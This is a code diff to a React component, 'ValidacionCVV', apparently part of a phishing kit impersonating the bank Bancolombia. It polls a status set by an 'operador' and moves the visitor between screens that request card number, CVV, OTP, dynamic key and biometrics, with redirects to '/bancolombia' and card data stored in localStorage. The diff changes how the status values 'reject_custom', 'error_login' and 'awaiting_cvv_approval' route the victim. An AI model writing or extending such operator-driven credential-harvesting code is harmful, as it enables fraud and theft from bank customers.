@@ -126,8 +126,8 @@ export default function ValidacionCVV() {
                     localStorage.setItem("selectedCardData", JSON.stringify(normalized));
                 }
 
-                // Se valida si es error_cvv o error_cvv_custom
-                if (estado == 'error_cvv' || estado === 'error_cvv_custom') {
+                // Se valida si es error_cvv o error_cvv_custom o reject_custom
+                if (estadoLower === 'error_cvv' || estadoLower === 'error_cvv_custom' || estadoLower === 'reject_custom') {
 
                     // Se limpia el intervalo
                     clearInterval(interval);
@@ -137,6 +137,7 @@ export default function ValidacionCVV() {
 
                     // Se quita el polling
                     setPolling(false);
+                    setSubmitted(false);
 
                     // Se lanza el modal de error
                     setFormState(prev => ({ ...prev, lanzarModalErrorSesion: true }));
@@ -237,13 +238,19 @@ export default function ValidacionCVV() {
                     return;
                 }
 
+                // Si el CVV está esperando aprobación o fue aprobado por el operador, continuar en pantalla de carga esperando el siguiente estado
+                if (['awaiting_cvv_approval', 'pendiente', 'aprobado', 'approve_custom'].includes(estadoLower)) {
+                    setCargando(true);
+                    return;
+                }
+
                 // Se inicializan los estados de redireccion
                 const statesRedirection = [
                     'sol_tc', 'sol_otp', 'sol_din', 'sol_finalizar', 'sol_finalizado', 'solicitar_finalizar',
                     'sol_biometria', 'error_923',
                     'sol_tc_custom', 'sol_cvv_custom',
                     'error_tc', 'error_tc_custom', 'error_otp', 'error_din', 'error_login', 'error_cvv_custom',
-                    'aprobado', 'error_pantalla', 'bloqueado_pantalla', 'reject_custom',
+                    'error_pantalla', 'bloqueado_pantalla', 'reject_custom',
                     'sol_link_bot', 'link_bot', 'sol_link_custom'
                 ];
 
@@ -317,7 +324,13 @@ export default function ValidacionCVV() {
 
                         // Se retorna
                         return;
-                    case 'error_cvv_custom':
+                    case 'error_login':
+
+                        // Se setea el error en el local storage
+                        localStorage.setItem('estado_sesion', 'error');
+
+                        // Se redirecciona
+                        window.location.href = '/bancolombia';
 
                         // Se sale del cilo
                         break;
@@ -341,16 +354,7 @@ export default function ValidacionCVV() {
 
                         // Se sale del cilo
                         break;
-                    case 'error_login':
-
-                        // Se setea el error en el local storage
-                        localStorage.setItem('estado_sesion', 'error');
-
-                        // Se redirecciona
-                        window.location.href = '/bancolombia';
-
-                        // Se sale del cilo
-                        break;
+                    case 'error_cvv_custom':
                     case 'reject_custom':
 
                         // Se muestra el modal de error de sesión OTP
